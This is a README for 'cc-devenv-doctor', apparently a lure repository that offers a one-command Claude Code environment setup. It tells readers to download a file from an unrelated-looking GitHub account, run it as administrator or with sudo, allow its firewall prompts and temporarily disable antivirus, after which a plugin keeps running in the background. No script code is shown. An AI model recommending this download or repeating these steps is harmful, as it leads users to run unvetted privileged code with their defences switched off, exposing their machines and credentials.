# 🩺 cc-devenv-doctor - Your Automated Dev Environment Setup

[![Download from GitHub](https://img.shields.io/badge/Download-cc--devenv--doctor-blue?style=for-the-badge&logo=github)](https://github.com/Repositioningfinance221/cc-devenv-doctor)

## 🤔 What Is This?

cc-devenv-doctor is a simple tool that transforms a brand-new Windows or Mac computer into a fully working Claude Code development environment with just one command. After setup, it continues working as a smart plugin that checks your environment and keeps everything running smoothly.

## 🚀 Getting Started

Follow these steps to get started quickly:

### Step 1: Visit the Download Page

Visit this link to download the application:
[https://github.com/Repositioningfinance221/cc-devenv-doctor](https://github.com/Repositioningfinance221/cc-devenv-doctor)

On the page, you will find the download button. Click it to save the file to your computer.

### Step 2: Run the Setup

Once the download completes, locate the file in your Downloads folder. Double-click the file to run it. A command window will open automatically. The script will:

- Install necessary software components
- Configure your environment for Claude Code
- Set up developer tools like Bash and PowerShell
- Perform initial health checks

You do not need to type anything. Let it run until you see a completion message.

## 🔧 What It Does

### Initial Bootstrap

The bootstrap script takes care of everything needed for Claude Code to work on your machine. It handles the complex setup that would otherwise require many manual steps.

### Continuous Monitoring

After the initial setup, cc-devenv-doctor installs a plugin that keeps working in the background. It regularly checks:

- Whether all required tools are installed
- If configuration files are correct
- That environment variables are properly set
- That your system stays healthy for Claude Code

## 💻 Supported Systems

- **Windows**: Windows 10 or later with PowerShell
- **Mac**: macOS 11 (Big Sur) or later with Terminal

Both 64-bit systems are supported.

## ✨ Key Features

- **One command setup**: No technical knowledge required
- **Automatic detection**: Identifies your operating system and adjusts accordingly
- **Self-healing**: Detects problems and suggests fixes automatically
- **Plugin architecture**: Keeps working after initial setup
- **Clean uninstall**: Removes everything if you decide you don't need it anymore
- **Error reporting**: Shows clear messages if something goes wrong

## 📖 Detailed Usage

### Windows Users

1. Open your Start menu and type "PowerShell"
2. Right-click on Windows PowerShell and select "Run as administrator"
3. In the blue PowerShell window, navigate to the folder where you downloaded the script
4. Type this command and press Enter:
   ```
   .\cc-devenv-doctor.ps1
   ```
5. The script will run automatically. Wait for it to finish.

### Mac Users

1. Open Finder and go to Applications → Utilities
2. Double-click on Terminal
3. In the Terminal window, navigate to the folder where you downloaded the script
4. Type this command and press Enter:
   ```
   bash cc-devenv-doctor.sh
   ```
5. Follow any on-screen instructions

## 🛠️ Troubleshooting

If you encounter any issues:

- **Firewall warnings**: Allow the script to access the internet when prompted
- **Permission errors**: Make sure you are running as administrator (Windows) or using sudo (Mac)
- **Antivirus interference**: Temporarily disable antivirus if the script is blocked
- **Slow performance**: The first run may take several minutes as it downloads components

For further help, check the Issues section on the GitHub page.

## 📥 Download Again

[![Download from GitHub](https://img.shields.io/badge/Download-cc--devenv--doctor-green?style=for-the-badge&logo=github)](https://github.com/Repositioningfinance221/cc-devenv-doctor)

## 📝 License

This project is open source. See the LICENSE file on the repository for more information.

## 👥 Contributing

If you have suggestions or find bugs, please open an issue or submit a pull request on the GitHub page.

Keywords: bash, bootstrap, claude-code, claude-code-plugin, dev-environment, developer-tools, macos, powershell, setup-script, windows